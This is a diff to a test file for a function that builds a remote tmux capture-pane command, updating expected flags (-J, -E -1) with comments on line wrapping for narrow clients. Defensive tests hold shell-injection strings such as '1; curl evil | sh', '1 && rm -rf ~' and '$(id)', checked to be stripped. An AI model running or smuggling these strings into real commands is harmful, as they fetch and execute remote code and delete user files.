@@ -187,20 +187,22 @@ describe('listDirArgs', () => {
 })
 
 describe('remoteCaptureHistoryArgs', () => {
-  it('captures history INCLUDING the visible screen (no -E) so the attach redraw leaves no gap', () => {
+  it('captures UNWRAPPED history EXCLUDING the visible screen (-J, -E -1)', () => {
     const args = remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', 5000)
     const cmd = args[args.length - 1]
-    expect(cmd).toContain('capture-pane -p -e -t nt-x -S -5000')
-    // `-E -1` would exclude the visible screen — but xterm's eraseInDisplay(2) (tmux's attach
-    // redraw) resets those viewport lines in place instead of scrolling them into scrollback,
-    // so the newest screenful would be lost. Capture it and let the redraw overwrite it.
-    expect(cmd).not.toContain('-E')
+    // `-J` unwraps: capture-pane hard-wraps at the HOST pane's width, so a narrower client (a
+    // phone) would re-wrap those fragments raggedly. `-E -1` drops the visible screen — tmux
+    // repaints it on attach, and `warmSeed` pushes the history above the fold so the two never
+    // overlap. Including it (and relying on the redraw to overwrite it) only works while the
+    // client's geometry matches the pane's, which on a phone it never does: the leftover rows
+    // survive in the scrollback as a duplicate of what is on screen.
+    expect(cmd).toContain('capture-pane -p -e -J -t nt-x -S -5000 -E -1')
   })
   it('a hostile `lines` value clamped by the caller cannot inject shell (defence in depth)', () => {
     const n = clampHistoryLines('1; curl evil | sh' as unknown as number)
     const cmd = remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', n).slice(-1)[0]
     expect(cmd).not.toContain('curl')
-    expect(cmd).toContain('capture-pane -p -e -t nt-x -S -5000')
+    expect(cmd).toContain('capture-pane -p -e -J -t nt-x -S -5000 -E -1')
   })
   it('clamps at the sink: a hostile value passed DIRECTLY never reaches the command string', () => {
     // A future call site (IPC handler / Server Edition shell) that forgets the caller-side clamp
@@ -208,7 +210,7 @@ describe('remoteCaptureHistoryArgs', () => {
     const hostile = ['1; curl evil.sh | sh', '1 && rm -rf ~', '$(id)', '`id`', '1\nid'] as unknown as number[]
     for (const bad of hostile) {
       const cmd = remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', bad).slice(-1)[0]
-      expect(cmd, String(bad)).toContain('capture-pane -p -e -t nt-x -S -5000')
+      expect(cmd, String(bad)).toContain('capture-pane -p -e -J -t nt-x -S -5000 -E -1')
       expect(cmd, String(bad)).not.toMatch(/[;&|`$()\n]/)
     }
   })
